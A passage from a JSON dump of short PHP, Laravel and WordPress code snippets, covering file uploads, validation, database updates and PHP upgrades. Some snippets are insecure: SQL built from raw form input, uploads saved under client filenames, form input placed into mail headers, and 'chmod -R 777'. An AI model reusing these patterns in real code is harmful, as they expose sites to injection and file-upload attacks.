    "description": "# php -- BEGIN cPanel-generated handler, do not edit # Set the &ldquo;ea-php74&rdquo; package as the default &ldquo;PHP&rdquo; programming language. <IfModule mime_module>   AddHandler application/x-httpd-ea-php74 .php .php7 .phtml </IfModule> # php -- END cPanel-generated handler, do not edit\nAddHandler application/x-httpd-php54 .php AddHandler application/x-httpd-php7 .php AddHandler application/x-httpd-php71 .php\n",
    "reg_date": "2021-10-12T10:20:46.000Z"
  },
  {
    "id": 5000,
    "keyword": null,
    "link": null,
    "title": " update php version wamp windows",
    "description": "For someone who need to update the PHP version in WAMP, I can recommend this http://wampserver.aviatechno.net/  I had a problems with updating too, but on this website are Wampserver addons like new php version (php 7.1.4 etc.) And you don't have to manually edit files like php.ini or phpForApache.  Enjoy!\nWampserver has an installator on their website. So you just download php version that you want from there and install it. here is the website    http://wampserver.aviatechno.net/\n",
    "reg_date": "2021-10-12T10:20:46.000Z"
  },
  {
    "id": 5001,
    "keyword": null,
    "link": null,
    "title": " update query in codeigniter using where condition",
    "description": "$data = array(         'title' => $title,         'name' => $name,         'date' => $date );  $this->db->where('id', $id); $this->db->update('mytable', $data); // Produces: // //      UPDATE mytable //      SET title = '{$title}', name = '{$name}', date = '{$date}' //      WHERE id = $id \npublic function update_row(){ \t\t \t\t$update_rows = array('field-name' => 'field-data',); \t\t$this->db->where('id', 1 ); \t\t$this->db->update('table-name', $update_rows);\t  \t}\t\n",
    "reg_date": "2021-10-12T10:20:47.000Z"
  },
  {
    "id": 5002,
    "keyword": null,
    "link": null,
    "title": " update query wordpress",
    "description": "global $wpdb; $dbData = array(); $dbData['last_login_time'] = time();  $wpdb->update('table_name', $dbData, array('user_id' => 1));\n$execut= $wpdb->query( $wpdb->prepare( \"UPDATE $wpdb->users SET user_nicename = %d WHERE ID = %s\", \"Harde_Bande\", 546 ) ); var_dump($execut); \n",
    "reg_date": "2021-10-12T10:20:47.000Z"
  },
  {
    "id": 5003,
    "keyword": null,
    "link": null,
    "title": " update user role wordpress",
    "description": "$user_meta = get_userdata( $user_id );  $user_roles = $user_meta->roles; // array with all the roles the user is part of. \n$wp_user_object = new WP_User($current_user->ID); $wp_user_object->set_role('editor'); \n",
    "reg_date": "2021-10-12T10:20:47.000Z"
  },
  {
    "id": 5004,
    "keyword": null,
    "link": null,
    "title": " upgrade php 7.3 centos 7",
    "description": "sudo yum -y install http://rpms.remirepo.net/enterprise/remi-release-7.rpm  sudo yum -y install epel-release yum-utils  sudo yum-config-manager --disable remi-php54 sudo yum-config-manager --enable remi-php73    sudo yum update    chmod -R 777 vendor php artisan view:clear php artisan config:cache  sudo chgrp www-data storage -R (Note: www-data is apache on Centos 7) sudo chmod g+rwx storage -R   if still doesn't work try: sudo setfacl -R -d -m g::rwx storage\n# yum install https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm # yum install http://rpms.remirepo.net/enterprise/remi-release-7.rpm \n$ wget -q http://rpms.remirepo.net/enterprise/remi-release-7.rpm $ wget -q https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm \n",
    "reg_date": "2021-10-12T10:20:47.000Z"
  },
  {
    "id": 5005,
    "keyword": null,
    "link": null,
    "title": " upgrade php to 7.3 ubuntu",
    "description": "sudo apt-get install software-properties-common sudo add-apt-repository ppa:ondrej/php sudo apt-get update sudo apt-get upgrade sudo apt-get install -y php7.3 \nsudo apt install -y php7.4-mysqli php7.4-pdo  php7.4-sqlite3 php7.4-ctype php7.4-fileinfo php7.4-zip php7.4-exif \n",
    "reg_date": "2021-10-12T10:20:47.000Z"
  },
  {
    "id": 5006,
    "keyword": null,
    "link": null,
    "title": " upload file to the server php database",
    "description": "<?php    if(isset($_FILES['image'])){       $errors= array();       $file_name = $_FILES['image']['name'];       $file_size =$_FILES['image']['size'];       $file_tmp =$_FILES['image']['tmp_name'];       $file_type=$_FILES['image']['type'];       $file_ext=strtolower(end(explode('.',$_FILES['image']['name'])));              $extensions= array(\"jpeg\",\"jpg\",\"png\");              if(in_array($file_ext,$extensions)=== false){          $errors[]=\"extension not allowed, please choose a JPEG or PNG file.\";       }              if($file_size > 2097152){          $errors[]='File size must be excately 2 MB';       }              if(empty($errors)==true){          move_uploaded_file($file_tmp,\"images/\".$file_name);          echo \"Success\";       }else{          print_r($errors);       }    } ?>\n <?php if(isset($_POST['btn-upload'])) {            $file = rand(1000,100000).\"-\".$_FILES['file']['name'];     $file_loc = $_FILES['file']['tmp_name'];  $file_size = $_FILES['file']['size'];  $file_type = $_FILES['file']['type'];  $folder=\"uploads/\";    move_uploaded_file($file_loc,$folder.$file);  $sql=\"INSERT INTO tbl_uploads(file,type,size) VALUES('$file','$file_type','$file_size')\";  mysql_query($sql);  } ?>\n",
    "reg_date": "2021-10-12T10:20:47.000Z"
  },
  {
    "id": 5007,
    "keyword": null,
    "link": null,
    "title": " upload max filesize in wordpress",
    "description": "Open the php.ini file  Locate the following line: upload_max_filesize = 100M    Replace 100M with a higher value in megabytes. (256 MB for example) This file allows you to configure other settings as well:  memory_limit 256M &ndash; Sets the max amount of memory a script can use. post_max_size 32M &ndash; Sets the max size for the total of the POST body data. max_execution_time 600 &ndash; Max time, in seconds, that a script is allowed to run. max_input_time 900 &ndash; Max time, in seconds, that a script is allowed to parse input data.  Save the file and exit.    /* I hope it will help you. Namaste Stay Home Stay Safe */\n@ini_set('upload_max_size' , '128M' );\n",
    "reg_date": "2021-10-12T10:20:47.000Z"
  },
  {
    "id": 5008,
    "keyword": null,
    "link": null,
    "title": " upload pdf file in php",
    "description": "<?php     // Store the file name into variable     $file = 'filename';     $filepath = \"https://www.example.com/\".$file;     // Header content type     header(\"Content-type: application/pdf\");     // Send the file to the browser.     readfile($filepath); \n<html> <head> <title>  FORM </title> </head> <body align=\"left\"> <h1> FILE UPLOAD </h1>  <form action = \"term5b.php\" method = \"POST\" enctype=\"multipart/form-data\"/>      <input type = \"file\" name = \"fileupload\"/></br>       <input type = \"submit\" name = \"opt\" value = \"upload\"/></br> </br>    </form> </body> </html>        <?php    $target_dir=\"E:\\ \";    $filename=$_FILES[\"fileupload\"][\"name\"];     $tmpname=$_FILES[\"fileupload\"][\"tmp_name\"];    $filetype=$_FILES[\"fileupload\"][\"type\"];    $errors=[];    $fileextensions=[\"pdf\"]; \t$arr=explode(\".\",$filename);    $ext=strtolower(end($arr));     $uploadpath=$target_dir.basename($filename); if(! in_array($ext,$fileextensions))    {      $errors[]=\"Invalid filename\";    }    if(empty($errors))    {      if(move_uploaded_file($tmpname,$uploadpath))      {        echo \"file uploaded successfully\";      }      else      {        echo \"not successfull\";      }    }    else    {       foreach($errors as $value)       {          echo \"$value\";       }    } ?> \n<?php include 'filesLogic.php';?> <!DOCTYPE html> <html lang=\"en\">   <head>     <link rel=\"stylesheet\" href=\"style.css\">     <title>Files Upload and Download</title>   </head>   <body>     <div class=\"container\">       <div class=\"row\">         <form action=\"index.php\" method=\"post\" enctype=\"multipart/form-data\" >           <h3>Upload File</h3>           <input type=\"file\" name=\"myfile\"> <br>           <button type=\"submit\" name=\"save\">upload</button>         </form>       </div>     </div>   </body> </html>\n",
    "reg_date": "2021-10-12T10:20:47.000Z"
  },
  {
    "id": 5009,
    "keyword": null,
    "link": null,
    "title": " upload video in laravel",
    "description": "<?php namespace App\\Http\\Controllers;  use Illuminate\\Support\\Facades\\Request;   class UploadController extends Controller {      public function upload(Request $request)     {          if(Request::hasFile('file')){              echo 'Uploaded';             $file = Request::file('file');             $file->move('uploads', $file->getClientOriginalName());             echo '$file' . $file->getClientOriginalName() . '\"/>';         }      } } \nuse Illuminate\\Support\\Facades\\Request;   class UploadController extends Controller {      public function upload(Request $request)     {          if(Request::hasFile('file')){              $file = Request::file('file');             $filename = $file->getClientOriginalName();             $path = public_path().'/uploads/';             return $file->move($path, $filename);         }      } } \n",
    "reg_date": "2021-10-12T10:20:47.000Z"
  },
  {
    "id": 5010,
    "keyword": null,
    "link": null,
    "title": " upppercase php",
    "description": "//string to all uppercase $string = \"String with Mixed use of Uppercase and Lowercase\"; //php string to uppercase $string = strtoupper($string); // = \"STRING WITH MIXED USE OF UPPERCASE AND LOWERCASE\"\nstring strtoupper ( $string ) \n$str = \"upper\"; //php string to uppercase echo strtoupper($str); // => UPPER\n",
    "reg_date": "2021-10-12T10:20:47.000Z"
  },
  {
    "id": 5011,
    "keyword": null,
    "link": null,
    "title": " url() inside laravel config files",
    "description": "Configs are loaded really early and probably not meant to use anything from the framework except Dotenv  return [     'photos_url' => URL::asset('xxx'), ];  Instead you can use:  return [     'photos_url' => env('APP_URL').'/rest_of_path.ext', ];\n",
    "reg_date": "2021-10-12T10:20:47.000Z"
  },
  {
    "id": 5012,
    "keyword": null,
    "link": null,
    "title": " url get contents php",
    "description": "<?php // this is an alternative of file_get_contents(); // with Curl >>  function url_get_contents ($Url) {     if (!function_exists('curl_init')){          die('CURL is not installed!');     }     $ch = curl_init();     curl_setopt($ch, CURLOPT_URL, $Url);     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);     $output = curl_exec($ch);     curl_close($ch);     return json_decode($output,JSON_OBJECT_AS_ARRAY); }  ?>\n",
    "reg_date": "2021-10-12T10:20:48.000Z"
  },
  {
    "id": 5013,
    "keyword": null,
    "link": null,
    "title": " use Class 'Carbon'  inside view",
    "description": "//use this method inside the view  \\Carbon\\Carbon::now(); \n",
    "reg_date": "2021-10-12T10:20:48.000Z"
  },
  {
    "id": 5014,
    "keyword": null,
    "link": null,
    "title": " use app name in laravel blade",
    "description": "{{ config('app.name') }}\n",
    "reg_date": "2021-10-12T10:20:48.000Z"
  },
  {
    "id": 5015,
    "keyword": null,
    "link": null,
    "title": " use auth automatic login on register",
    "description": "// do not forget validation! $this->validate($request, [             'name' => 'required|max:255',             'email' => 'required|email|max:255|unique:users',             'password' => 'required|confirmed|min:6',         ]);  $data = $request->all();  $user = User::create([             'name' => $data['name'],             'email' => $data['email'],             'password' => bcrypt($data['password']),         ]); Auth::login($user);\n",
    "reg_date": "2021-10-12T10:20:48.000Z"
  },
  {
    "id": 5016,
    "keyword": null,
    "link": null,
    "title": " use class Auth larave3l",
    "description": "composer require laravel/ui  php artisan ui vue --auth  npm install && npm run dev\nuse Illuminate\\Support\\Facades\\Auth;\n//namespace use Illuminate\\Support\\Facades\\Auth;\n",
    "reg_date": "2021-10-12T10:20:48.000Z"
  },
  {
    "id": 5017,
    "keyword": null,
    "link": null,
    "title": " use dates with laravel livewire",
    "description": "    /// This solved my issue with dates and laravel livewire      <div wire.ignore.self>     <input wire.model=\"birthday_date\"  id=\"birthday_date\" class=\"form-controll date\" >    <script>             document.addEventListener('livewire:load', function () {                                      $('#birthday_date').on('dp.change', function (e) {                                          @this.set('birthday_date', e.target.value);                     });             });         </script>    </div>\n",
    "reg_date": "2021-10-12T10:20:48.000Z"
  },
  {
    "id": 5018,
    "keyword": null,
    "link": null,
    "title": " use font awesome in laravel 8",
    "description": "npm install (if you have already, no need)npm install --save @fortawesome/fontawesome-free\n$fa-font-path:        \"../webfonts\";@import \"~@fortawesome/fontawesome-free/scss/fontawesome\";@import \"~@fortawesome/fontawesome-free/scss/solid\";@import \"~@fortawesome/fontawesome-free/scss/brands\";@import \"~@fortawesome/fontawesome-free/scss/regular\";\n",
    "reg_date": "2021-10-12T10:20:48.000Z"
  },
  {
    "id": 5019,
    "keyword": null,
    "link": null,
    "title": " use guzzle http client laravel",
    "description": "public function putGuzzleRequest()  {      $client = new \\GuzzleHttp\\Client();      $url = \"http://myexample.com/api/posts/1\";      $myBody['name'] = \"Demo\";      $request = $client->put($url,  ['body'=>$myBody]);      $response = $request->send();        dd($response);  }\n",
    "reg_date": "2021-10-12T10:20:49.000Z"
  },
  {
    "id": 5020,
    "keyword": null,
    "link": null,
    "title": " use if in laravel blade",
    "description": "@if (foo)   // do something @elseif (bar)   // do something else @else   // do some other thing; @endif\n@if($user->status =='active')                <td>{{ $user->name }}</td>          @else       <td> Guest </td>         @endif\n@if (count($records) === 1)     I have one record! @elseif (count($records) > 1)     I have multiple records! @else     I don't have any records! @endif\n@if ($dummy == 1)    we have 1 record@elseif ($dummy ==10)    we have 10 record@else    No record found.@endif\n",
    "reg_date": "2021-10-12T10:20:49.000Z"
  },
  {
    "id": 5021,
    "keyword": null,
    "link": null,
    "title": " use model from variable laravel",
    "description": "$model_name = 'App\\Model\\User'; $model_name::where('id', $id)->first();  $model = $this->model_name; $model::where('id', $id)->first();\n",
    "reg_date": "2021-10-12T10:20:49.000Z"
  },
  {
    "id": 5022,
    "keyword": null,
    "link": null,
    "title": " use php variable in html attributes",
    "description": "<span title=\"<?php echo htmlspecialchars($variable); ?>\">\n",
    "reg_date": "2021-10-12T10:20:49.000Z"
  },
  {
    "id": 5023,
    "keyword": null,
    "link": null,
    "title": " use resource in laravel 8",
    "description": "Verb          Path                        Action  Route Name GET           /users                      index   users.index GET           /users/create               create  users.create POST          /users                      store   users.store GET           /users/{user}               show    users.show GET           /users/{user}/edit          edit    users.edit PUT|PATCH     /users/{user}               update  users.update DELETE        /users/{user}               destroy users.destroy\nphp artisan make:controller PhotoController --resource --model=Photo\nRoute::resource('my/path/to/whereever/I/like', 'MyController', [     'names' => [         'index' => 'my_route_base_name.index',         'edit' => 'my_route_base_name.edit',         'create' => 'my_route_base_name.create',         etc...     ], ])\nResource Controller:This controller will create all CRUD methods php artisan make:controller nameOfController --resource\n",
    "reg_date": "2021-10-12T10:20:49.000Z"
  },
  {
    "id": 5024,
    "keyword": null,
    "link": null,
    "title": " use str laravel",
    "description": "use Illuminate\\Support\\Str\n",
    "reg_date": "2021-10-12T10:20:49.000Z"
  },
  {
    "id": 5025,
    "keyword": null,
    "link": null,
    "title": " use sweet alert 2  to delete confirmation laravel",
    "description": "<!doctype html> <html lang=\"en\"> <head>     <!-- Required meta tags -->     <meta charset=\"utf-8\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">     <!-- csrf-token -->     <meta name=\"csrf-token\" content=\"{{ csrf_token() }}\">     <!-- Bootstrap CSS -->     <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css\"           integrity=\"sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm\" crossorigin=\"anonymous\">     <!-- jquery -->     <script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js\"></script>     <!-- SweetAlert2 -->     <link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.2.0/sweetalert2.min.css\">     <script src=\"https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.2.0/sweetalert2.all.min.js\"></script>      <title>Use SweetAlert2 with AJAX in Laravel</title> </head> <body class=\"container\" style=\"margin-top: 40px;\">  <div class=\"row\" style=\"margin-bottom: 20px;\">     <div class=\"col-lg-12 margin-tb\">         <div class=\"pull-left\">             <h3>Users</h3>         </div>     </div> </div>  <table class=\"table table-bordered\">     <tr>         <th>ID</th>         <th>Name</th>         <th>Email</th>         <th width=\"280px\">Actions</th>     </tr>     @foreach ($users as $user)         <tr>             <td>{{ $user->id }}</td>             <td>{{ $user->name }}</td>             <td>{{ $user->email }}</td>             <td>                 <button class=\"btn btn-danger\" onclick=\"deleteConfirmation({{$user->id}})\">Delete</button>             </td>         </tr>     @endforeach </table>  <script type=\"text/javascript\">     function deleteConfirmation(id) {         swal({             title: \"Delete?\",             text: \"Please ensure and then confirm!\",             type: \"warning\",             showCancelButton: !0,             confirmButtonText: \"Yes, delete it!\",             cancelButtonText: \"No, cancel!\",             reverseButtons: !0         }).then(function (e) {              if (e.value === true) {                 var CSRF_TOKEN = $('meta[name=\"csrf-token\"]').attr('content');                  $.ajax({                     type: 'POST',                     url: \"{{url('/delete')}}/\" + id,                     data: {_token: CSRF_TOKEN},                     dataType: 'JSON',                     success: function (results) {                          if (results.success === true) {                             swal(\"Done!\", results.message, \"success\");                         } else {                             swal(\"Error!\", results.message, \"error\");                         }                     }                 });              } else {                 e.dismiss;             }          }, function (dismiss) {             return false;         })     } </script> </body> </html>\n<script src=\"https://unpkg.com/sweetalert/dist/sweetalert.min.js\"></script>  $('.delete-confirm').on('click', function (event) {     event.preventDefault();     const url = $(this).attr('href');     swal({         title: 'Are you sure?',         text: 'This record and it`s details will be permanantly deleted!',         icon: 'warning',         buttons: [\"Cancel\", \"Yes!\"],     }).then(function(value) {         if (value) {             window.location.href = url;         }     }); });\n<a href=\"\" class=\"button\" data-id=\"{{$user->id}}\">Delete</a>\n",
    "reg_date": "2021-10-12T10:20:49.000Z"
  },
  {
    "id": 5026,
    "keyword": null,
    "link": null,
    "title": " use wordpress functions in external php file",
    "description": "//add to the file that needs to use wordpress functions. require_once(\"../../../../wp-load.php\"); //or require_once(rtrim($_SERVER['DOCUMENT_ROOT'], '/') . '/wp-load.php');\n",
    "reg_date": "2021-10-12T10:20:49.000Z"
  },
  {
    "id": 5027,
    "keyword": null,
    "link": null,
    "title": " user-agent cURL php",
    "description": "$config['useragent'] = 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0';  curl_setopt($curl, CURLOPT_USERAGENT, $config['useragent']); curl_setopt($curl, CURLOPT_REFERER, 'https://www.domain.com/'); \n",
    "reg_date": "2021-10-12T10:20:50.000Z"
  },
  {
    "id": 5028,
    "keyword": null,
    "link": null,
    "title": " users not having any role laravel spatie",
    "description": "User::whereDoesntHave('roles')\n",
    "reg_date": "2021-10-12T10:20:50.000Z"
  },
  {
    "id": 5029,
    "keyword": null,
    "link": null,
    "title": " using a php array in jquery",
    "description": "<?php \t// PHP Array   $names = array('John', 'Doe', 'Joe'); ?>  <script>   // Convert the data to JSON format \tlet users = <?php echo json_encode($names); ?>; \talert(users[0]); // It output John </script>\n",
    "reg_date": "2021-10-12T10:20:50.000Z"
  },
  {
    "id": 5030,
    "keyword": null,
    "link": null,
    "title": " using custom fonts in php",
    "description": "@font-face {font-family: \"My Custom Font\"; src: url('../fonts/gurbaniwebthick.ttf') ;} \n",
    "reg_date": "2021-10-12T10:20:50.000Z"
  },
  {
    "id": 5031,
    "keyword": null,
    "link": null,
    "title": " using js variable in php",
    "description": "<script type=\"text/javascript\"> var abc= 'this is text'; <?php $abc = \"<script>document.write(abc)</script>\"?>    </script> <?php echo $abc;?>\n<script type=\"text/javascript\">    var php_var = \"<?php echo $php_var; ?>\"; </script>\n<script>    var res = \"success\"; </script> <?php    echo \"<script>document.writeln(res);</script>\"; ?>\n<script> var p1 = \"success\"; </script>  <?php echo \"<script>document.writeln(p1);</script>\"; ?>\n",
    "reg_date": "2021-10-12T10:20:50.000Z"
  },
  {
    "id": 5032,
    "keyword": null,
    "link": null,
    "title": " using laravel back function on blade",
    "description": "{{ url()->previous() }} \n{{ url()->previous() }}\n",
    "reg_date": "2021-10-12T10:20:50.000Z"
  },
  {
    "id": 5033,
    "keyword": null,
    "link": null,
    "title": " using mysql database with php",
    "description": "<?php $servername = \"localhost\"; $username = \"yourusername\"; // For MYSQL the predifined username is root $password = \"yourpassword\"; // For MYSQL the predifined password is \" \"(blank)  // Create connection $conn = new mysqli($servername, $username, $password);    // Check connection   if ($conn->connect_error) {      die(\"Connection failed: \" . $conn->connect_error); }  echo \"Connected successfully\";  ?>\n",
    "reg_date": "2021-10-12T10:20:50.000Z"
  },
  {
    "id": 5034,
    "keyword": null,
    "link": null,
    "title": " using phpmyadmin on bitnami to access RDS instance",
    "description": "# Edit the phpMyAdmin configuration file at  #  /opt/bitnami/apps/phpmyadmin/htdocs/config.inc.php  #  and add the lines below to the end of the file:  $i++; $cfg['Servers'][$i]['verbose'] = 'Amazon RDS'; $cfg['Servers'][$i]['host'] = 'RDS-ENDPOINT'; $cfg['Servers'][$i]['port'] = '3306'; $cfg['Servers'][$i]['socket'] = ''; $cfg['Servers'][$i]['connect_type'] = 'tcp'; $cfg['Servers'][$i]['extension'] = 'mysqli'; $cfg['Servers'][$i]['auth_type'] = 'cookie'; $cfg['Servers'][$i]['AllowNoPassword'] = false; \n",
    "reg_date": "2021-10-12T10:20:50.000Z"
  },
  {
    "id": 5035,
    "keyword": null,
    "link": null,
    "title": " utf8 encode php",
    "description": "$a = \"N&atilde;o\";    echo utf8_encode($a);   \nutf8_encode ( string $data )\n",
    "reg_date": "2021-10-12T10:20:51.000Z"
  },
  {
    "id": 5036,
    "keyword": null,
    "link": null,
    "title": " uuid in laravel",
    "description": "//above in controller use Illuminate\\Support\\Str;  //in function $uuid = Str::uuid()->toString();  //terminal composer require \"webpatser/laravel-uuid:^3.0\"\nuse Illuminate\\Support\\Str;  $uuid = Str::uuid()->toString(); \n$table->uuid('id');\nuse Illuminate\\Support\\Str;  $isUuid = Str::isUuid('a0a2a2d2-0b87-4a18-83f2-2529882be2de');  // true  $isUuid = Str::isUuid('laravel');  // false\n",
    "reg_date": "2021-10-12T10:20:51.000Z"
  },
  {
    "id": 5037,
    "keyword": null,
    "link": null,
    "title": " uuid nom package for laravel 18.04",
    "description": "//above in controller use Illuminate\\Support\\Str;  //in function $uuid = Str::uuid()->toString();  //terminal composer require \"webpatser/laravel-uuid:^3.0\"\n",
    "reg_date": "2021-10-12T10:20:51.000Z"
  },
  {
    "id": 5038,
    "keyword": null,
    "link": null,
    "title": " uuid package generator laravel",
    "description": "//above in controller use Illuminate\\Support\\Str;  //in function $uuid = Str::uuid()->toString();  //terminal composer require \"webpatser/laravel-uuid:^3.0\"\n",
    "reg_date": "2021-10-12T10:20:51.000Z"
  },
  {
    "id": 5039,
    "keyword": null,
    "link": null,
    "title": " valdidate laravel if falid",
    "description": "$validator = Validator::make($request->all(), [     'name' => 'required|min:2|max:255' ]);  if ($validator->fails()) {     return view('view_name'); } else {     return view('view_name'); } \npublic function store() {     $this->validate(request(), [         'song' => [function ($attribute, $value, $fail) {             if ($value <= 10) {                 $fail(':attribute needs more cowbell!');             }         }]     ]); } \n",
    "reg_date": "2021-10-12T10:20:51.000Z"
  },
  {
    "id": 5040,
    "keyword": null,
    "link": null,
    "title": " valid number in excel php",
    "description": "// $val['number'] => cell on excel   $start_y \t\t\t\t\t\t= intval($val[5]) == 0 ? date(\"Y\") : $val[5]; $start_m\t\t\t\t\t\t= intval($val[6]) == 0 ? date(\"m\") : $val[6]; $start_d \t\t\t\t\t\t= intval($val[7]) == 0 ? date(\"d\") : $val[7]; $end_y \t\t\t\t\t\t\t= intval($val[8]) == 0 ? date(\"Y\") + 1 : $val[8]; $end_m\t\t\t\t\t\t\t= intval($val[9]) == 0 ? date(\"m\") : $val[9]; $end_d \t\t\t\t\t\t\t= intval($val[10]) == 0 ? date(\"d\") : $val[10];\n",
    "reg_date": "2021-10-12T10:20:51.000Z"
  },
  {
    "id": 5041,
    "keyword": null,
    "link": null,
    "title": " validate contact us page 2021 php coding",
    "description": "<?php if(!empty($_POST[\"send\"])) { \t$name = $_POST[\"userName\"]; \t$email = $_POST[\"userEmail\"]; \t$subject = $_POST[\"subject\"]; \t$content = $_POST[\"content\"];  \t$toEmail = \"admin@phppot_samples.com\"; \t$mailHeaders = \"From: \" . $name . \"<\". $email .\">\\r\\n\"; \tif(mail($toEmail, $subject, $content, $mailHeaders)) { \t    $message = \"Your contact information is received successfully.\"; \t    $type = \"success\"; \t} } require_once \"contact-view.php\"; ?>\n<?php $conn = mysqli_connect(\"localhost\", \"root\", \"test\", \"blog_samples\") or die(\"Connection Error: \" . mysqli_error($conn)); mysqli_query($conn, \"INSERT INTO tblcontact (user_name, user_email,subject,content) VALUES ('\" . $name. \"', '\" . $email. \"','\" . $subject. \"','\" . $content. \"')\"); $insert_id = mysqli_insert_id($conn); if(!empty($insert_id)) { $message = \"Your contact information is saved successfully\"; ?> \nCREATE TABLE `tblcontact` (   `contact_id` int(11) NOT NULL,   `user_name` varchar(100) NOT NULL,   `user_email` varchar(255) NOT NULL,   `subject` varchar(255) NOT NULL,   `content` text NOT NULL ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci; \n",
    "reg_date": "2021-10-12T10:20:51.000Z"
  },
  {
    "id": 5042,
    "keyword": null,
    "link": null,
    "title": " validate correct format email php",
    "description": "$email = $_POST[\"email\"]; if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {   $emailErr = \"Invalid email format\"; }\n// E-mail Code Validation using a four digit number:  // var.inc.php:  <?php  session_start(); $x = mt_rand(1000,9999); // index.php:  <?php  include_once 'var.inc.php'; $_SESSION['key'] = $x; if(isset($_POST['submit'])){     if(!mail($_POST['email-in'], \"Verify\", \"Code: \". $x)){         echo \"ERROR EMAIL\";     }else{         header(\"Location: validate.php\");     } } ?> <!DOCTYPE html> <html lang=\"en\"> <head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">     <title>Validate email</title> </head>  <body>     <form action=\"\" method=\"post\">         <input type=\"email\" placeholder=\"email\" name=\"email-in\">         <button id=\"submit\" type=\"submit\" name=\"submit\">Submit</button>     </form> </body> </html> // validate.php:    <?php session_start();?> <!DOCTYPE html> <html lang=\"en\"> <head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">     <title>Validate</title> </head> <body>     <form action=\"\" method=\"post\">         <input type=\"number\" name=\"user-key\">         <button type=\"submit\" name=\"submit-user-key\">Validate</button>     </form> </body> </html> <?php      if(isset($_POST['submit-user-key'])){         if($_POST['user-key'] == $_SESSION['key']){             //Do something         }     } ?>\n//BE CAREFUL!!! //NEVER VALIDATE A EMAIL WITH A NORMAL PREG MATCH //I SAW THIS A LOT VALIDATING A EMAIL IS THE BEST TO SEND A EMAIL  //AND VERIFY //BECAUSE SOMEONE MIGHT HAVE A RIGHT EMAIL THAT DOESNT WORK BECAUSE OF  //PREG MATCH\n",
    "reg_date": "2021-10-12T10:20:51.000Z"
  },
  {
    "id": 5043,
    "keyword": null,
    "link": null,
    "title": " validate each value from array laravel",
    "description": "$validator = Validator::make($request->all(), [     \"names\"    => \"required|array|min:3\",     \"names.*\"  => \"required|string|distinct|min:3\", ]); \n",
    "reg_date": "2021-10-12T10:20:52.000Z"
  },
  {
    "id": 5044,
    "keyword": null,
    "link": null,
    "title": " validate executable path vscode",
    "description": "/* File->Preferences->settings->User settings tab->extensions->from the drop down select php->on the right pane under PHP &rsaquo; Validate: Executable Path select edit in settings.json.  Then set the path as your case may be e.g for a xamp user who installed xammp on c drive you will have: */ \"php.validate.executablePath\": \"c:\\\\xampp\\\\php\\\\php.exe\"  /*  If php is installed in your system independently or by other means simply set the path of your php.exe file like below: */ \"php.validate.executablePath\": \"C://path.to.your.php.folder//php.exe\"\n{   \"php.validate.executablePath\": \"c:/php/php.exe\" }\n",
    "reg_date": "2021-10-12T10:20:52.000Z"
  },
  {
    "id": 5045,
    "keyword": null,
    "link": null,
    "title": " validate if correct image url php",
    "description": "$image_name = $_FILES[\"inputname\"][\"name\"]; $allowed_extensions = array(\"png\", \"jpg\", \"jpeg\"); $image_extension = explode(\".\", $image_name); /*   *Explode returns array of words   *Explode Example:   \texplode(search_for, where to search for);     let imagine that the image named => myimage.png     expldoe funtion will search the word for '.' and explode it     from the example, explode will return array(\"myimage\", \"png\")     Now we find our image extension, but it is in the array.     we use end() function that will return the last index in the array as a string */ $extension = end($image_extension); // which is png if(!in_array($extension, $allowed_extensions)){   echo \"Please upload an image\"; } else{   echo \"Allowed Image\"; } \nIf you want to be absolutely sure, and your PHP is enabled for remote  connections, you can just use \"getimagesize('url')\"  function validImage($url) {    return stripos(getimagesize($url)['mime'], 'image') === 0; }  $image = validImage('http://www.example.com/image.jpg');  If it returns an array, it is an image type recognized by PHP, even if the  image extension is not in the url (per your second link). You have to keep in mind that this method will make a remote connection for each request, so  perhaps cache urls that you already probed in a database to lower connections.\n",
    "reg_date": "2021-10-12T10:20:52.000Z"
  },
  {
    "id": 5046,
    "keyword": null,
    "link": null,
    "title": " validate laravel",
    "description": "'email' => 'required|email|unique:users,email', //@sujay\npublic function store(Request $request) {     $validator = Validator::make($request->all(), [         'title' => 'bail|required|max:255',         'body' => 'required',     ]);      // Check validation failure     if ($validator->fails()) {        // [...]              foreach($validator->messages()->getMessages() as $field_name => $messages) {                  // Go through each message for this field.                 foreach($messages AS $message) {                     echo '***********'.$message.'***********<br>';                 }             }     }      // Check validation success     if ($validator->passes()) {        // [...]     }      // Retrieve errors message bag     $errors = $validator->errors(); }\n @if ($errors->any())      @foreach ($errors->all() as $error)          <div>{{$error}}</div>      @endforeach  @endif \n$validatedData = $request->validate([     'title' => ['required', 'unique:posts', 'max:255'],     'body' => ['required'], ]);\n<!-- /resources/views/post/create.blade.php -->  <h1>Create Post</h1>  @if ($errors->any())     <div class=\"alert alert-danger\">         <ul>             @foreach ($errors->all() as $error)                 <li>{{ $error }}</li>             @endforeach         </ul>     </div> @endif  <!-- Create Post Form -->\n\t\t//import\t\t \t\tuse Illuminate\\Support\\Facades\\Validator; \t \t\t// single var check         $validator = Validator::make(['data' => $value],             ['data' => 'string|min:1|max:10']         );         if ($validator->fails()) {             // your code         }          // array check         $validator = Validator::make(['data' => $array],             ['email' => 'string|min:1|max:10'],             ['username' => 'string|min:1|max:10'],             ['password' => 'string|min:1|max:10'],             ['...' => '...']         );          if ($validator->fails()) {             // your code         }\n",
    "reg_date": "2021-10-12T10:20:52.000Z"
  },
  {
    "id": 5047,
    "keyword": null,
    "link": null,
    "title": " validate names regex php",
